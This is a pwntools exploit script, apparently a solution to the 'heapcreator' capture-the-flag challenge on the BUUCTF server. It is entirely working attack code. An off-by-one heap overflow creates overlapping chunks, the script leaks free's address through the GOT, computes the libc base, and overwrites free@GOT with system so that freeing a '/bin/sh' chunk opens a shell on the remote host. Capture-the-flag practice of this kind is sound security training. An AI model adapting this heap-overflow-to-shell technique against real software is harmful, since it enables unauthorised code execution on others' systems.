from pwn import *
context.log_level = 'debug'
# io = gdb.debug('./heapcreator')
# io = process('./heapcreator')
io = remote('node5.buuoj.cn',26714)
elf = ELF('./heapcreator')
lib = ELF('/home/bamuwe/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')

def add(size,content):
    io.sendlineafter(b'choice :',b'1')
    io.sendlineafter(b'Size of Heap :',str(size))
    io.sendlineafter(b'Content of heap:',content)
    
def free(idx):
    io.sendlineafter(b'choice :',b'4')
    io.sendlineafter(b'Index :',str(idx))

def edit(idx,content):
    io.sendlineafter(b'choice :',b'2')
    io.sendlineafter(b'Index :',str(idx))
    io.sendlineafter(b'Content of heap :',content)
    
def show(idx):
    io.sendlineafter(b'choice :',b'3')  
    io.sendlineafter(b'Index :',str(idx))

add(0x18,b'0000')   #0
add(0x10,b'1111')   #1
add(0x10,b'2222')   #2
add(0x10,b'/bin/sh\x00')    #3

edit(0,b'A'*0x18+p8(129))
free(1)
add(0x70,b'A'*0x40+p64(0xdeadbeef)+p64(elf.got['free']))
show(2)
io.recvuntil("Content : ")
free_addr=u64(io.recvuntil("Done")[:-5].ljust(8,b'\x00'))
success(hex(free_addr))
libc_base = free_addr-0x83a70
sys_addr = lib.sym['system']+libc_base
edit(2,p64(sys_addr))
free(3)
io.interactive()
